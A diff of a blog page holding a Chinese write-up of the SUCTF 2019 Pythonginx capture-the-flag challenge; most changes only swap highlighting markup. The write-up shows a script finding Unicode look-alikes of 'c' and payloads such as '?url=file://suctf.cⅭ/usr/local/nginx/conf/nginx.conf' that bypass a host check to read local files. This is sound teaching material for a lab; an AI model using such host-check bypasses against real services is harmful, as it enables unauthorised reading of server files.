@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,7 +255,7 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png" srcset="/img/loading.gif">   </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了源码：     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-meta">        @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
+<pre><code><pre><code class="hljs python"><span class="hljs-meta">        @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>():</span>
     url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)
     host = parse.urlparse(url).hostname
@@ -267,10 +275,10 @@
     <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:
         <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
     <span class="hljs-keyword">else</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span></code></pre></div></code></pre>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span></code></pre></code></pre>
 <p>前两个if不能等于<code>suctf.cc</code>，第三个if读取文件—-&gt;<code>file</code>协议<br>第三个if要<code>host == &#39;suctf.cc&#39;</code><br>不过第三个前面还有个decode<br>所以对输入的加密即可      </p>
 <p>偷大佬的脚本：       </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit
 <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span>():</span>
     <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
@@ -304,7 +312,7 @@
         <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 
 <span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:
-    get_unicode()</code></pre></div>
+    get_unicode()</code></pre>
 
 
 
@@ -321,14 +329,14 @@ str: ⓒ unicode: \u24d2
 str: Ｃ unicode: \uff23
 str: ｃ unicode: \uff43</code></pre>
 <p>把最后一个c替换即可<br>题目提示nginx，读取nginx的文件         </p>
-<div class="hljs"><pre><code>配置文件存放目录：/etc/nginx
+<pre><code>配置文件存放目录：/etc/nginx
 主配置文件：/etc/nginx/conf/nginx.conf
 管理脚本：/usr/lib64/systemd/system/nginx.service
 模块：/usr/lisb64/nginx/modules
 应用程序：/usr/sbin/nginx
 程序默认存放位置：/usr/share/nginx/html
 日志默认存放位置：/var/log/nginx
-配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre></div>
+配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?url=file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf</code><br>然后读取flag<br>payload:<code>?url=file://suctf.cⅭ/usr/fffffflag</code>     </p>
 
             </div>
@@ -474,6 +482,8 @@ str: ｃ unicode: \uff43</code></pre>
 
 
 
+  
+    
   
 
 
